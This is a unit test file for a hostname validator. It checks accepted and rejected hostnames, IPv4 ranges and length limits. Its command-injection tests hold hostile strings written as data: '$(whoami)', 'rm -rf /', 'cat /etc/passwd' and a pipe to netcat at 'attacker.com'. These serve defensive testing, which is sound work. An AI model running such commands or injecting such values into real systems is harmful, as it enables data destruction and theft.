/**
 * Tests for isValidHostname function
 * Security-critical: validates hostnames for network operations
 */

import { describe, it, expect } from 'vitest';
import { isValidHostname } from '../../../src/utils/security.js';

describe('isValidHostname', () => {
  describe('valid hostnames', () => {
    it('should accept simple hostnames', () => {
      expect(isValidHostname('localhost')).toBe(true);
      expect(isValidHostname('myserver')).toBe(true);
      expect(isValidHostname('web01')).toBe(true);
    });

    it('should accept domain names', () => {
      expect(isValidHostname('example.com')).toBe(true);
      expect(isValidHostname('www.example.com')).toBe(true);
      expect(isValidHostname('sub.domain.example.com')).toBe(true);
    });

    it('should accept hostnames with hyphens', () => {
      expect(isValidHostname('my-server')).toBe(true);
      expect(isValidHostname('web-01')).toBe(true);
      expect(isValidHostname('my-sub.example.com')).toBe(true);
    });

    it('should accept hostnames with numbers', () => {
      expect(isValidHostname('server1')).toBe(true);
      expect(isValidHostname('123server')).toBe(true);
      expect(isValidHostname('s3.amazonaws.com')).toBe(true);
    });

    it('should accept IPv4 addresses', () => {
      expect(isValidHostname('192.168.1.1')).toBe(true);
      expect(isValidHostname('10.0.0.1')).toBe(true);
      expect(isValidHostname('172.16.0.1')).toBe(true);
      expect(isValidHostname('8.8.8.8')).toBe(true);
      expect(isValidHostname('255.255.255.255')).toBe(true);
      expect(isValidHostname('0.0.0.0')).toBe(true);
    });

    it('should accept single character labels', () => {
      expect(isValidHostname('a')).toBe(true);
      expect(isValidHostname('a.b.c')).toBe(true);
    });
  });

  describe('invalid hostnames', () => {
    it('should reject empty string', () => {
      expect(isValidHostname('')).toBe(false);
    });

    it('should reject null/undefined', () => {
      expect(isValidHostname(null as unknown as string)).toBe(false);
      expect(isValidHostname(undefined as unknown as string)).toBe(false);
    });

    it('should reject hostnames starting with hyphen', () => {
      expect(isValidHostname('-server')).toBe(false);
      expect(isValidHostname('-example.com')).toBe(false);
    });

    it('should reject hostnames ending with hyphen', () => {
      expect(isValidHostname('server-')).toBe(false);
      expect(isValidHostname('example-.com')).toBe(false);
    });

    it('should reject hostnames with consecutive dots', () => {
      expect(isValidHostname('example..com')).toBe(false);
      expect(isValidHostname('a..b')).toBe(false);
    });

    it('should reject hostnames with special characters', () => {
      expect(isValidHostname('server;echo')).toBe(false);
      expect(isValidHostname('server|cat')).toBe(false);
      expect(isValidHostname('server&cmd')).toBe(false);
      expect(isValidHostname('server$var')).toBe(false);
      expect(isValidHostname('server`id`')).toBe(false);
      expect(isValidHostname('server<file')).toBe(false);
      expect(isValidHostname('server>file')).toBe(false);
    });

    it('should reject hostnames with spaces', () => {
      expect(isValidHostname('server name')).toBe(false);
      expect(isValidHostname(' server')).toBe(false);
      expect(isValidHostname('server ')).toBe(false);
    });

    it('should reject hostnames with underscores (technically invalid in DNS)', () => {
      expect(isValidHostname('my_server')).toBe(false);
      expect(isValidHostname('_dmarc.example.com')).toBe(false);
    });

    it('should reject invalid IPv4 addresses (octet > 255)', () => {
      expect(isValidHostname('256.1.1.1')).toBe(false);
      expect(isValidHostname('1.256.1.1')).toBe(false);
      expect(isValidHostname('1.1.256.1')).toBe(false);
      expect(isValidHostname('1.1.1.256')).toBe(false);
    });

    it('should accept numeric-looking hostnames that are valid DNS names', () => {
      // These look like malformed IPs but are valid hostnames
      // (e.g., '1.1.1' and '1.1.1.1.1' are valid DNS labels)
      expect(isValidHostname('1.1.1')).toBe(true);
      expect(isValidHostname('1.1.1.1.1')).toBe(true);
    });
  });

  describe('length limits', () => {
    it('should reject hostnames exceeding 253 characters', () => {
      const longHostname = 'a'.repeat(254);
      expect(isValidHostname(longHostname)).toBe(false);
    });

    it('should accept hostnames up to 253 characters', () => {
      // Create a valid hostname close to max length
      const labels = [];
      let length = 0;
      while (length < 250) {
        const label = 'a'.repeat(Math.min(63, 250 - length));
        labels.push(label);
        length += label.length + 1;
      }
      const hostname = labels.join('.');
      if (hostname.length <= 253) {
        expect(isValidHostname(hostname)).toBe(true);
      }
    });
  });

  describe('command injection prevention', () => {
    it('should reject command injection attempts via hostname', () => {
      expect(isValidHostname('$(whoami).example.com')).toBe(false);
      expect(isValidHostname('`id`.example.com')).toBe(false);
      expect(isValidHostname('example.com;rm -rf /')).toBe(false);
      expect(isValidHostname('example.com && cat /etc/passwd')).toBe(false);
      expect(isValidHostname('example.com | nc attacker.com 1234')).toBe(false);
    });

    it('should reject newline/carriage return injection', () => {
      expect(isValidHostname('example.com\nmalicious')).toBe(false);
      expect(isValidHostname('example.com\rmalicious')).toBe(false);
    });
  });
});
